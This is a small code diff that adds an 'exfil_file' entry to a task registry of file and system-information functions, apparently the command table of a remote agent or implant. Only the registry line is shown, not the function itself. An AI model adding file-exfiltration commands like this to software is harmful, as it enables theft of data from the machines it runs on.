@@ -10,6 +10,7 @@ TASK_REGISTRY = {
     "write_file": filesystem.write_file,
     "delete_file": filesystem.delete_file,
     "sample_file": filesystem.sample_file,
+    "exfil_file" : filesystem.exfil_file,
     "get_sysinfo": sysinfo.get_sysinfo,
     "get_env" : sysinfo.get_env,
     "get_uptime" : sysinfo.get_uptime,
